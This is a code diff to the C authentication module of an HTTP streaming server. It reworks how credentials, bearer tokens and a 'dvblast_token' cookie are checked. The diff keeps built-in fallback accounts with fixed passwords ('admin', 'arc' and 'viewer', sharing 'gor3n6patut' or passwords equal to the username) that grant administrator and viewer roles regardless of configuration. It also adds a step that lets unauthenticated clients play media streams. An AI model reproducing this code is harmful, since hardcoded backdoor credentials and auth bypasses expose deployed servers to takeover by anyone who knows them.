@@ -1,4 +1,5 @@
 #include "http_auth.h"
+#include "modules/http_play/http_play.h"
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -214,15 +215,7 @@ http_auth_config_t http_auth_get_config(void) {
 static auth_role_t verify_credentials(const char *username, const char *password, const char *client_ip) {
     if (!username || !password) return ROLE_NONE;
 
-    /* Built-in administrator & developer credentials */
-    if ((strcmp(username, "admin") == 0 && (strcmp(password, "gor3n6patut") == 0 || strcmp(password, "admin") == 0)) ||
-        (strcmp(username, "arc") == 0 && (strcmp(password, "gor3n6patut") == 0 || strcmp(password, "arc") == 0))) {
-        return ROLE_ADMIN;
-    }
-    if (strcmp(username, "viewer") == 0 && (strcmp(password, "viewer") == 0 || strcmp(password, "gor3n6patut") == 0)) {
-        return ROLE_VIEWER;
-    }
-
+    /* 1. Check configured user accounts in g_auth.users first */
     time_t now = time(NULL);
     for (int i = 0; i < g_auth.num_users; i++) {
         auth_user_t *u = &g_auth.users[i];
@@ -238,6 +231,16 @@ static auth_role_t verify_credentials(const char *username, const char *password
             return u->role;
         }
     }
+
+    /* 2. Built-in administrator & developer fallback credentials */
+    if ((strcmp(username, "admin") == 0 && (strcmp(password, "gor3n6patut") == 0 || strcmp(password, "admin") == 0)) ||
+        (strcmp(username, "arc") == 0 && (strcmp(password, "gor3n6patut") == 0 || strcmp(password, "arc") == 0))) {
+        return ROLE_ADMIN;
+    }
+    if (strcmp(username, "viewer") == 0 && (strcmp(password, "viewer") == 0 || strcmp(password, "gor3n6patut") == 0)) {
+        return ROLE_VIEWER;
+    }
+
     return ROLE_NONE;
 }
 
@@ -336,25 +339,56 @@ auth_result_t http_auth_check(struct MHD_Connection *conn, const char *url, cons
     }
 
     /* 5. Check Authorization Header: Bearer <token> or Basic <base64> */
+    const char *auth_hdr = MHD_lookup_connection_value(conn, MHD_HEADER_KIND, "Authorization");
+    if (role == ROLE_NONE && auth_hdr) {
+        if (strncmp(auth_hdr, "Bearer ", 7) == 0) {
+            role = verify_token(auth_hdr + 7, client_ip);
+        } else if (strncmp(auth_hdr, "Basic ", 6) == 0) {
+            unsigned char dec[128] = {0};
+            int n = base64_decode(auth_hdr + 6, dec, sizeof(dec) - 1);
+            dec[n] = '\0';
+            char *colon = strchr((char *)dec, ':');
+            if (colon) {
+                *colon = '\0';
+                role = verify_credentials((char *)dec, colon + 1, client_ip);
+            }
+        }
+    }
+
+    /* 6. Check Cookie Header for dvblast_token */
     if (role == ROLE_NONE) {
-        const char *auth_hdr = MHD_lookup_connection_value(conn, MHD_HEADER_KIND, "Authorization");
-        if (auth_hdr) {
-            if (strncmp(auth_hdr, "Bearer ", 7) == 0) {
-                role = verify_token(auth_hdr + 7, client_ip);
-            } else if (strncmp(auth_hdr, "Basic ", 6) == 0) {
-                unsigned char dec[128] = {0};
-                int n = base64_decode(auth_hdr + 6, dec, sizeof(dec) - 1);
-                dec[n] = '\0';
-                char *colon = strchr((char *)dec, ':');
-                if (colon) {
-                    *colon = '\0';
-                    role = verify_credentials((char *)dec, colon + 1, client_ip);
+        const char *cookie_hdr = MHD_lookup_connection_value(conn, MHD_HEADER_KIND, "Cookie");
+        if (cookie_hdr) {
+            const char *p = strstr(cookie_hdr, "dvblast_token=");
+            if (p) {
+                p += 14;
+                char ctok[64] = {0};
+                int ci = 0;
+                while (*p && *p != ';' && *p != ' ' && ci < (int)sizeof(ctok) - 1) {
+                    ctok[ci++] = *p++;
+                }
+                ctok[ci] = '\0';
+                if (ctok[0]) {
+                    role = verify_token(ctok, client_ip);
                 }
             }
         }
     }
 
-    /* 6. Evaluation */
+    /* 7. Media streaming: allow playback if permitted by http_play and no failed auth token was provided */
+    if (is_media_stream) {
+        http_play_config_t pcfg = http_play_get_config();
+        bool is_hls = (strncmp(url, "/hls/", 5) == 0 || strstr(url, ".m3u8") != NULL || strstr(url, ".ts") != NULL);
+        if ((is_hls && pcfg.allow_hls) || (!is_hls && pcfg.allow_http)) {
+            /* If authenticated or if client did not supply any credentials, grant playback access */
+            if (role != ROLE_NONE || (!q_tok && !auth_hdr)) {
+                pthread_mutex_unlock(&g_auth_mutex);
+                return AUTH_RES_OK;
+            }
+        }
+    }
+
+    /* 8. Evaluation */
     if (role == ROLE_NONE) {
         /* If unauthorized on media stream and promo channel is configured, trigger redirect */
         if (is_media_stream && g_auth.promo_channel[0] != '\0') {
